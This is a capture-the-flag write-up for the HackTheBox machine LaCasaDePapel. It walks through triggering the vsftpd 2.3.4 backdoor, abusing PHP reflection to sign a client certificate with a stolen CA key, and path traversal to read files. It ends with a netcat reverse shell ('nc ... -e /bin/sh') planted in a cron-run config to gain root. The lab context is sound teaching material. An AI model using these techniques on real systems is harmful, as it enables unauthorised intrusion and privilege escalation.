---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-04-13-lacasadepapel-hackthebox
tags:
- client certificates
- cronjob
- hackthebox
- linux
- php
title: LaCasaDePapel @ HackTheBox
---

LaCasaDePapel is a rather easy machine on [hackthebox.eu](https://www.hackthebox.eu), featuring the use of php reflection, creating and signing of client certificates and the abuse of a cronjob. Unfortunately the box was very unstable and slow for me and therefore pretty unenjoyable.

## User Flag

We start with a quick port scan using `nmap -Pn -n -sC -sV 10.10.10.131` and see the following open ports:

```
PORT     STATE    SERVICE     VERSION
21/tcp   open     ftp         vsftpd 2.3.4
22/tcp   open     ssh         OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp   open     http        Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp  open     ssl/http    Node.js Express framework
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|   http/1.1
|_  http/1.0
1066/tcp filtered fpo-fns
2998/tcp filtered iss-realsec
6006/tcp filtered X11:6
Service Info: OS: Unix
```

On first sight the ftp version seems very interesting because there are public exploits and a metasploit module for vsftpd 2.3.4. The exploit activates a backdoor that was found in the program. We run metasploit against the target which seems to fail:

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.131:21 - USER: 331 Please specify the password.
[+] 10.10.10.131:21 - Backdoor service has been spawned, handling...
[-] 10.10.10.131:21 - The service on port 6200 does not appear to be a shell
```

Metasploit did trigger the backdoor and open the port, however it could not connect to the shell that should spawn there. We double check by using nc:

```
➜  ~ nc 10.10.10.131 6200
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
ls
Variables: $tokyo
```

We find that psysh is a php shell which means we have to write php code to execute commands that are not in the default list ( which we can get by issuing the help command). Running `phpinfo();` we see that a lot of functions that would give a shell are disabled:

```
disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

We can however use `scandir("<dir>")`, `file_get_contents("<file>")` and `file_put_contents(<file>)` to enumerate the box a bit:

```
scandir("/home");
=> [
     ".",
     "..",
     "berlin",
     "dali",
     "nairobi",
     "oslo",
     "professor",
   ]
```

```
scandir("/home/berlin");
=> [
     ".",
     "..",
     ".ash_history",
     ".ssh",
     "downloads",
     "node_modules",
     "server.js",
     "user.txt",
   ]
```

```
file_get_contents("/home/berlin/user.txt")
PHP Warning:  file_get_contents(/home/berlin/user.txt): failed to open stream: Permission denied
```

We found the the user flag but can’t read it unfortunately with our current user. There is however an interesting file in one of the other home directories:

```
scandir("/home/nairobi");
=> [
     ".",
     "..",
     "ca.key",
     "download.jade",
     "error.jade",
     "index.jade",
     "node_modules",
     "server.js",
     "static",
   ]
```

The "ca.key" file reminds of the box "Fortune" which required to create a client certificate to access a web site. We look at tcp port 443 to see if this is a similar problem:

![](htb_lasadepapel_certerror.png)

Indeed we seem to require a client certificate which is a bit strange since the server is not directly asking for one (it just says it on the page).

With `show` we can look at the "$tokyo" object we saw in the beginning:

```
show $tokyo
  > 2| class Tokyo {
    3|     private function sign($caCert,$userCsr) {
    4|         $caKey = file_get_contents('/home/nairobi/ca.key');
    5|         $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
    6|         openssl_x509_export($userCert, $userCertOut);
    7|         return $userCertOut;
    8|     }
    9| }
```

This looks exactly like the class we need to sign a client certificate. To use it we have to figure out a way to call the function (it is private) and provide it with the arguments it needs. First we create a private key and a certificate signing request:

```
openssl req -newkey rsa:2048 -keyout xct.priv -out xct.csr -nodes -days 365 -subj "/CN=xct" -pubout
```

Then we save the websites certificate in the browser to file and make both things available via a local python webserver. Finally we execute the necessary commands to sign our csr and get the certificate:

```
$ca = file_get_contents("http://10.10.16.66:8000/ca.crt")
$user = file_get_contents("http://10.10.16.66:8000/xct.csr")
$c = new ReflectionClass($tokyo)
$m = $c->getMethod('sign')
$m->setAccessible(true)
$m->invoke($tokyo, $ca, $user)
```

```
-----BEGIN CERTIFICATE-----
MIICvjCCAaagAwIBAgIBADANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFsYWNh
c2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0xOTA0
MTMxMjI1NDhaFw0yMDA0MTIxMjI1NDhaMA4xDDAKBgNVBAMMA3hjdDCCASIwDQYJ
KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoIP00Yl9c0YelThgEMfh7YFSkTGa2R
h9LRVF8Pt00Srq5LQIqCWkiSko03DMpv5r8Jc+2wu7hpCPG70KuIkNS9ldloCOJ5
wcUEx4EiMoLEMCYS9KEG7z3PwyXUIwI8MsKArH0d9uPWqCZXg4uGqtNIi8SoDMiF
ueiFJh5XHvw3YQc2z/cX48yhHi9tAqZowlOYg3oaF3liqQQO9VsgCp3xuQRrCNIW
KhbaGSYXzDFvSoN7kRr0RTxYpjM92Sie/mYWcdKa4AkplmonLFajRaEBeWsQxYAU
s6eUmsgDyyzj+jPFrF68NvBg6Lw+3YM34bsJsxc1/cgx9A8ObXaMedECAwEAATAN
BgkqhkiG9w0BAQsFAAOCAQEAdTMJrHhyu4c9DEN7YA39XhOfqM7mLuo8e5Epbi2b
0MSfrx3TwhddEet3BRC64VGYebcNZJRxB6O8n5bTAy9Tpk/321PqOB3TA173K0w4
PUm7/5KNZY23fmHRcO5rbtFWV4te5XNu8hZayeuB5NS5fr2EH0MvLkGNzybDAZcq
UnKeYBXx2IeELtY6SGkVgddMITHuLFBJOTgDFXpOtGklhD3utyryAsMXxXPisL3j
m39aggnj56sNn/mZJmh2VjRGd3HOdClNAbl2W0kirayVKnjULC57goDWYlGbOBoK
q+1mtacjxQmVaQJ4i56VsCyRaY4DnnemwfPC9/jkB5n/QQ==
-----END CERTIFICATE-----
```

We can convert this certificate to pkcs12 (`openssl pkcs12 -export -clcerts -in signed.cert -inkey xct.priv -out xct.p12`) and import it into firefox (Privacy &Security->View Certificates->Import) and finally load the site that hides behind it:

![](htb_lasadepapel_privatesite.png)

We see that the season downloader is vulnerable to a simple path traversal:

```
https://10.10.10.131/?path=../

    .ash_history
    .ssh
    downloads
    node_modules
    server.js
    user.txt
```

This however just allows to list files not download them. When we go back to the "normal" season downloader we see that it requests files with a base64 encoded path:

```
https://10.10.10.131/file/U0VBU09OLTEvMDEuYXZp

➜  echo -ne "U0VBU09OLTEvMDEuYXZp" | base64 -d
SEASON-1/01.avi%
```

We learned by decoding how to make a request that downloads a specific file and can read the user flag this way:

```
echo -ne "../user.txt" | base64
Li4vdXNlci50eHQ=
https://10.10.10.131/file/Li4vdXNlci50eHQ=
```

## Root Flag

In the .ssh folder we can find a private key and download it. However it does not seem to belong to the user "berlin", so we try it for all users and eventually succeed as "professor":

```
➜  lacasadepapel ssh -i id_rsa professor@10.10.10.131

 _             ____                  ____         ____                  _
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|

lacasadepapel [~]$ whoami
professor
```

We inspect the running processes and find memcached running in combination with several memcached files in the home directory of professor:

```
8221 nobody    0:02 /usr/bin/node /home/professor/memcached.js
-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js
drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
```

We also see that in "/etc/crontabs" an entry called "professor" exists which we can not read. Looking at the content of memcached.ini we see that it seems to run a command with sudo:

```
[program:memcached]
command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
```

If we could modify the command we could probably get command execution in the context of root. When looking at the file permissions we see that we do not have permissions to modify the file. There is however a suid bit set on the home folder of professor (which is very uncommon). This means we can, despite having no direct access to the file, move and replace it.

We backup the original file, modify it, and get a shell as root:

```
mv memcached.ini memcached.ini.bak
echo -e "[program:memcached]
command = sudo nc 10.10.16.66 6000 -e /bin/sh" > memcached.ini
```